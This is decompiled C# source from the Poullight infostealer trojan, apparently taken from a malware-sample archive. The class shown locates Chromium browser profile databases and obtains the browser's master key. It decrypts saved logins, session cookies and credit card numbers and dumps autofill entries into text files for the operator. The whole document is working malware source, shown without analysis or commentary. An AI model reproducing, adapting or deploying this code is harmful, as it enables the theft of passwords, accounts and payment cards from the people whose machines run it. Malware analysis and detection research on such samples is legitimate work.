// Decompiled with JetBrains decompiler
// Type: EGChromeC
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using EntryLoader;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Web;

internal class EGChromeC
{
  protected static Chrome chrome = EntryPoint.chrome;
  protected static int CCookies = 0;
  protected static int CPasswords = 0;
  protected static int cfill = 0;
  protected static int CCards = 0;

  public static void Start()
  {
    string[] search_files = new string[4]
    {
      "co*es",
      "log*ta",
      "we*ata",
      "loc*ate"
    };
    List<string> _out1 = new List<string>();
    List<string> _out2 = new List<string>();
    Recursive.Search(Buffer.path_lad, ref _out1, Buffer.string_0, search_files, 3);
    Recursive.Search(Buffer.path_ad, ref _out2, Buffer.string_0, search_files, 3);
    List<string> stringList = _out1.Count<string>() <= 1 || _out2.Count<string>() <= 1 ? (_out1.Count<string>() > 1 ? _out1 : (_out2.Count<string>() > 1 ? _out2 : (List<string>) null)) : _out1.Concat<string>((IEnumerable<string>) _out2).ToList<string>();
    bool flag = false;
    string str1 = "";
    int num1 = 0;
    int num2 = 0;
    if (!Directory.Exists(string.Format("{0}Browsers", (object) Buffer.path_l)))
      Directory.CreateDirectory(string.Format("{0}Browsers", (object) Buffer.path_l));
    if (!Directory.Exists(string.Format("{0}Autofill", (object) Buffer.path_l)))
      Directory.CreateDirectory(string.Format("{0}Autofill", (object) Buffer.path_l));
    if (!Directory.Exists(string.Format("{0}Cards", (object) Buffer.path_l)))
      Directory.CreateDirectory(string.Format("{0}Cards", (object) Buffer.path_l));
    if (stringList != null)
    {
      foreach (string path in stringList)
      {
        string lower = Path.GetFileName(path).ToLower();
        if (!flag && lower.Contains("state"))
        {
          EGChromeC.chrome.GETMasterKey(path);
          flag = true;
        }
        else if (lower.Contains("login"))
        {
          string str2 = EGChromeC.PasswordParse(path);
          str1 += string.IsNullOrEmpty(str2) ? "" : string.Format("{0}\n\n", (object) str2.Trim());
        }
        else if (lower.Contains("cookie"))
        {
          ++num1;
          EGChromeC.CookieParse(path, string.Format("{0}Browsers\\[{1}-{2}] Cookies.txt", (object) Buffer.path_l, (object) path.Split(new string[1]
          {
            "AppData\\"
          }, StringSplitOptions.None)[1].Split('\\')[1], (object) num1));
        }
        else if (lower.Contains("web"))
        {
          ++num2;
          EGChromeC.fillParse(path, string.Format("{0}Autofill\\[{1}-{2}] Autofill.txt", (object) Buffer.path_l, (object) path.Split(new string[1]
          {
            "AppData\\"
          }, StringSplitOptions.None)[1].Split('\\')[1], (object) num2));
          EGChromeC.CCParse(path, string.Format("{0}Cards\\[{1}-{2}] Cards.txt", (object) Buffer.path_l, (object) path.Split(new string[1]
          {
            "AppData\\"
          }, StringSplitOptions.None)[1].Split('\\')[1], (object) num2));
        }
      }
    }
    if (!string.IsNullOrEmpty(str1.Trim()))
      File.WriteAllText(string.Format("{0}Browsers\\Passwords.txt", (object) Buffer.path_l), str1.Trim().Replace("\n", Environment.NewLine));
    Buffer.XBufferData[0] = EGChromeC.CCookies.ToString();
    Buffer.XBufferData[1] = EGChromeC.CPasswords.ToString();
    Buffer.XBufferData[10] = EGChromeC.cfill.ToString();
    Buffer.XBufferData[11] = EGChromeC.CCards.ToString();
    if (((IEnumerable<string>) Directory.GetFiles(string.Format("{0}Browsers", (object) Buffer.path_l), "*.txt")).Count<string>() == 0)
      File.WriteAllText(string.Format("{0}Browsers\\info.txt", (object) Buffer.path_l), string.Format("{0}Похоже что пользователь удаляет свои куки и пароли. Или же браузер не определен.", (object) Buffer.head));
    if (((IEnumerable<string>) Directory.GetFiles(string.Format("{0}Autofill", (object) Buffer.path_l), "*.txt")).Count<string>() == 0)
      File.WriteAllText(string.Format("{0}Autofill\\info.txt", (object) Buffer.path_l), string.Format("{0}Похоже что пользователь не сохраняет автофилл. Или же браузер не определен.", (object) Buffer.head));
    if (((IEnumerable<string>) Directory.GetFiles(string.Format("{0}Cards", (object) Buffer.path_l), "*.txt")).Count<string>() != 0)
      return;
    File.WriteAllText(string.Format("{0}Cards\\info.txt", (object) Buffer.path_l), string.Format("{0}Карты не найдены. Похоже что пользователь не использует карты для оплаты.", (object) Buffer.head));
  }

  protected static void CCParse(string path, string save)
  {
    try
    {
      if (!File.Exists(path))
        return;
      string str1 = string.Format("{0}{1}", (object) Buffer.path_t, (object) GetRandom.String());
      if (File.Exists(str1))
        File.Delete(str1);
      try
      {
        File.Copy(path, str1, true);
      }
      catch
      {
        try
        {
          str1 = string.Format("{0}{1}", (object) Buffer.path_ds, (object) GetRandom.String());
          if (File.Exists(str1))
            File.Delete(str1);
          File.Copy(path, str1, true);
        }
        catch
        {
          return;
        }
      }
      string str2 = "";
      if (File.ReadAllLines(str1).Length >= 75)
      {
        Sqlite sqlite = new Sqlite(str1);
        sqlite.ReadTable("CC");
        int rowCount;
        try
        {
          rowCount = sqlite.GetRowCount();
        }
        catch
        {
          return;
        }
        for (int rowNum = 0; rowNum < rowCount; ++rowNum)
        {
          try
          {
            if (rowNum >= 100)
            {
              if (string.IsNullOrEmpty(str2))
                break;
            }
            if (!string.IsNullOrEmpty(sqlite.GetValue(rowNum, 1)))
            {
              string str3;
              try
              {
                str3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(rowNum, 12), false);
                if (string.IsNullOrEmpty(str3))
                  str3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(rowNum, 12));
              }
              catch
              {
                continue;
              }
              str2 += string.Format("\n\nНазвание: {0}.\nНомер: {1}.\nМесяц/Год: {2}/{3}.\nСчет: {4}.", (object) sqlite.GetValue(rowNum, 1), (object) str3, (object) sqlite.GetValue(rowNum, 2), (object) sqlite.GetValue(rowNum, 3), (object) sqlite.GetValue(rowNum, 9));
              ++EGChromeC.CCards;
            }
          }
          catch
          {
          }
        }
        try
        {
          File.Delete(str1);
        }
        catch
        {
        }
      }
      string contents = str2.Trim().Replace("\n", Environment.NewLine);
      if (string.IsNullOrEmpty(contents))
        return;
      File.WriteAllText(save, contents);
    }
    catch
    {
    }
  }

  protected static void fillParse(string path, string save)
  {
    try
    {
      if (!File.Exists(path))
        return;
      string str1 = string.Format("{0}{1}", (object) Buffer.path_t, (object) GetRandom.String());
      if (File.Exists(str1))
        File.Delete(str1);
      try
      {
        File.Copy(path, str1, true);
      }
      catch
      {
        try
        {
          str1 = string.Format("{0}{1}", (object) Buffer.path_ds, (object) GetRandom.String());
          if (File.Exists(str1))
            File.Delete(str1);
          File.Copy(path, str1, true);
        }
        catch
        {
          return;
        }
      }
      string str2 = "";
      if (File.ReadAllLines(str1).Length >= 75)
      {
        Sqlite sqlite = new Sqlite(str1);
        sqlite.ReadTable("Autofill");
        int rowCount;
        try
        {
          rowCount = sqlite.GetRowCount();
        }
        catch
        {
          return;
        }
        for (int rowNum = 0; rowNum < rowCount; ++rowNum)
        {
          try
          {
            if (rowNum >= 100)
            {
              if (string.IsNullOrEmpty(str2))
                break;
            }
            if (!string.IsNullOrEmpty(sqlite.GetValue(rowNum, 0)))
            {
              if (!string.IsNullOrEmpty(sqlite.GetValue(rowNum, 1)))
              {
                str2 += string.Format("\n\n\nType: {0}\nValue: {1}", (object) sqlite.GetValue(rowNum, 0), (object) Encoding.UTF8.GetString(Encoding.Default.GetBytes(sqlite.GetValue(rowNum, 1))));
                ++EGChromeC.cfill;
              }
            }
          }
          catch
          {
          }
        }
        try
        {
          File.Delete(str1);
        }
        catch
        {
        }
      }
      string contents = str2.Trim().Replace("\n", Environment.NewLine);
      if (string.IsNullOrEmpty(contents))
        return;
      File.WriteAllText(save, contents);
    }
    catch
    {
    }
  }

  protected static string PasswordParse(string path)
  {
    try
    {
      if (!File.Exists(path))
        return "";
      string str1 = "";
      string str2 = string.Format("{0}{1}", (object) Buffer.path_t, (object) GetRandom.String());
      if (File.Exists(str2))
        File.Delete(str2);
      try
      {
        File.Copy(path, str2, true);
      }
      catch
      {
        try
        {
          str2 = string.Format("{0}{1}", (object) Buffer.path_ds, (object) GetRandom.String());
          if (File.Exists(str2))
            File.Delete(str2);
          File.Copy(path, str2, true);
        }
        catch
        {
          return (string) null;
        }
      }
      if (File.ReadAllLines(str2).Length < 37)
        return "";
      Sqlite sqlite = new Sqlite(str2);
      sqlite.ReadTable("logins");
      int rowCount;
      try
      {
        rowCount = sqlite.GetRowCount();
      }
      catch
      {
        return "";
      }
      for (int rowNum = 0; rowNum < rowCount; ++rowNum)
      {
        try
        {
          string str3 = sqlite.GetValue(rowNum, 0);
          string str4 = sqlite.GetValue(rowNum, 3);
          string str5;
          try
          {
            str5 = EGChromeC.chrome.Decrypt(sqlite.GetValue(rowNum, 5), false);
            if (string.IsNullOrEmpty(str5))
              str5 = EGChromeC.chrome.Decrypt(sqlite.GetValue(rowNum, 5));
          }
          catch
          {
            continue;
          }
          if (!string.IsNullOrEmpty(str3.Trim()))
          {
            if (!string.IsNullOrEmpty(str4.Trim()))
            {
              if (!string.IsNullOrEmpty(str5.Trim()))
              {
                str1 += "=====================================\n";
                str1 += string.Format("URL: {0}\n", (object) str3);
                str1 += string.Format("Login: {0}\n", (object) str4);
                str1 += string.Format("Password: {0}\n", (object) str5);
                str1 += "=====================================\n\n\n";
                ++EGChromeC.CPasswords;
              }
            }
          }
        }
        catch
        {
        }
      }
      try
      {
        File.Delete(str2);
      }
      catch
      {
      }
      return str1.Replace("\n", Environment.NewLine).Trim();
    }
    catch
    {
      return "";
    }
  }

  protected static void CookieParse(string path, string save)
  {
    try
    {
      if (!File.Exists(path))
        return;
      string str1 = string.Format("{0}{1}", (object) Buffer.path_t, (object) GetRandom.String());
      if (File.Exists(str1))
        File.Delete(str1);
      try
      {
        File.Copy(path, str1, true);
      }
      catch
      {
        try
        {
          str1 = string.Format("{0}{1}", (object) Buffer.path_ds, (object) GetRandom.String());
          if (File.Exists(str1))
            File.Delete(str1);
          File.Copy(path, str1, true);
        }
        catch
        {
          return;
        }
      }
      if (File.ReadAllLines(str1).Length < 21)
        return;
      Sqlite sqlite = new Sqlite(str1);
      sqlite.ReadTable("cookies");
      int rowCount;
      try
      {
        rowCount = sqlite.GetRowCount();
      }
      catch
      {
        return;
      }
      string str2 = "";
      int totalSeconds = (int) DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds;
      int num = 31104000;
      for (int rowNum = 0; rowNum < rowCount; ++rowNum)
      {
        try
        {
          string str3;
          try
          {
            str3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(rowNum, 12), false);
            if (string.IsNullOrEmpty(str3))
              str3 = EGChromeC.chrome.Decrypt(sqlite.GetValue(rowNum, 12));
          }
          catch
          {
            continue;
          }
          str2 += string.Format("{0}\tTRUE\t{1}\t{2}\t{3}\t{4}\t{5}{6}", (object) sqlite.GetValue(rowNum, 1), (object) sqlite.GetValue(rowNum, 4), sqlite.GetValue(rowNum, 6) == "1" ? (object) "TRUE" : (object) "FALSE", (object) (totalSeconds + num), (object) sqlite.GetValue(rowNum, 2), HttpUtility.UrlDecode(str3).Contains("\"") ? (object) str3 : (object) HttpUtility.UrlDecode(str3), (object) Environment.NewLine);
          ++EGChromeC.CCookies;
        }
        catch
        {
        }
      }
      try
      {
        File.Delete(str1);
      }
      catch
      {
      }
      if (string.IsNullOrEmpty(str2))
        return;
      File.WriteAllText(save, string.Format("# Netscape HTTP Cookie File{0}{1}", (object) Environment.NewLine, (object) str2.Trim()));
    }
    catch
    {
    }
  }
}
